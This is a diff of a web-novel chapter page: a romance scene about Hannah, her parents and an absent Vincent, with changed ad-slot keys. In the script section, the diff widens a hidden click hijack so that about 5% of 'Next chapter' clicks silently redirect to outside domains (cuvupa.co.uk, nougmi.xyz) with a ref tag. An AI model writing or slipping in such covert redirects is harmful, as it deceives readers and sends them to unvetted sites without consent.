@@ -2390,12 +2390,12 @@
                 <p>No hesitation showed in Hannah&#39;s response. &#34;Of course.&#34;</p>
                 <p>A plan took root in her mind. If Vincent managed to salvage today and smoothed things over with her parents, she&#39;d let bygones be bygones and even try to avoid another fight with him for the rest of their days together,however few remained.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>As they made their way across the lot, the familiar lines of the Bentley caught Hannah&#39;s eye. Excitement surged as she hurried ahead and pulled open the back door.</p>
                 <p>But the seat inside was empty. Her hopeful expression vanished. Confusion and disappointment twisted inside her.Where was Vincent now?</p>
                 <p>Derek&#39;s eyes flicked to Hannah, instantly picking up on her expectation that Vincent would be waiting in the car, ready to greet them. The disappointment etched on her face confirmed his suspicions.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Turning away from the empty seat, Hannah finally looked to Derek for answers. He offered a stiff,apologetic smile and then reached into the back for several gift bags. &#34;Mr. and Mrs. Scott, Mr. Jones wanted you to have these,&#34; he said, holding them out politely.</p>
                 <p>Raymond didn&#39;t reach for the bags. His voice had gone cool. &#34;Is Vincent coming? Where is he now?&#34;</p>
                 <p>Carefully, Derek tried to explain, &#34;Mr. Jones got pulled into a last-minute merger negotiation. He couldn&#39;t break away. As soon as he realized he wouldn&#39;t make it in time, he asked me to deliver these gifts in his place.&#34;</p>
@@ -2405,12 +2405,12 @@
                 <p>Swiping at the sweat on his borow, Derek tried to defuse the tension, wishing this part of his job didn&#39;t feel so thankless.</p>
                 <p>Hannah forced herself to stay composed. &#34;It&#39;s almost time, Mom, Dad. Let me walk you back to the train.&#34;Facing Derek, her tone was icy. &#34;We don&#39;t need the gifts. My parents have enough to carry as it is.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Her eyes held not a shred of warmth.</p>
                 <p>Derek hesitated, trying again to offer the bags, but neither parent budged. Seeing no other option, he quietly returned everything to the trunk, not saying another word.</p>
                 <p>Hannah dismissed Derek with a nod, then slipped an arm around her parents and led them to the train platform herself.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>Minutes before departure, Margaret pulled Hannah into a tight embrace. &#34;Hannah, if you&#39;re ever unhappy,just come home. We&#39;ll take care of you.&#34;</p>
                 <p>Raymond didn&#39;t speak, but the firm pat on Hannah&#39;s shoulder said enough.</p>
                 <p>Hot tears threatened to spill as Hannah nodded,her heart aching. Her parents had made the long journey out of concern, only to leave with deep worry for her.Self-blame and sorrow pressed down on her as she watched the train roll away.</p>
@@ -2538,7 +2538,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2554,8 +2554,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
